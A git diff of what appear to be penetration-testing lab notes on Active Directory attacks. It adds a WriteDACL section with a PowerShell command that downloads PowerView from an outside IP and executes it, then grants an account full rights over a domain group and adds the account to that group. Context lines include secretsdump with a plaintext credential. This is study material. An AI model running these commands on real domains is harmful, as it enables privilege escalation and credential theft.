@@ -529,7 +529,7 @@ runas /user:corp\jen powershell.exe
 
   *
 
-      <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+      <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 * Add target DC and generic domain to /etc/hosts
@@ -621,9 +621,24 @@ runas /user:corp\jen powershell.exe
 <summary>Exploiting WriteDACL</summary>
 
 * Can add new access rights like GenericAll, GenericWrite, or even DCSync
+*
+
+    <figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 * Adding GenericAll rights:
   * ```powershell
-    Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights All
+    # Might need to migrate to sqlsvc process using metasploit
+
+    # Load PowerView
+    iex (new-object net.webclient).downloadstring('http://192.168.45.215/PowerView.ps1')
+
+    # Modify sqlsvc to have full control over the mailadmins group
+    Add-DomainObjectAcl -Rights 'All' -TargetIdentity "mailadmins" -PrincipalIdentity "sqlsvc"
+
+    # Add sqlsvc to mailadmins domain group
+    net group "mailadmins" sqlsvc /add /domain
+
+    # Verify that sqlsvc is inside mailadmins group
+    net user sqlsvc /domain
     ```
 
 </details>
@@ -767,7 +782,7 @@ nslookup appsrv01
           <figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 
-      * Dump the NTLM hashes for Files01 computer account (FILES01$)![](<../.gitbook/assets/image (1) (1) (1) (1).png>)
+      * Dump the NTLM hashes for Files01 computer account (FILES01$)![](<../.gitbook/assets/image (1) (1) (1) (1) (1).png>)
         *   ```powershell
             impacket-secretsdump CORP/adam:4Toolsfigure3@192.168.101.104
             ```
@@ -851,7 +866,7 @@ nslookup appsrv01
     </strong><strong>Get-DomainUser -TrustedToAuth
     </strong></code></pre>
 
-    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 * Contained delegation is configured on IISSvc and it is only allowed to MSSQLSvc
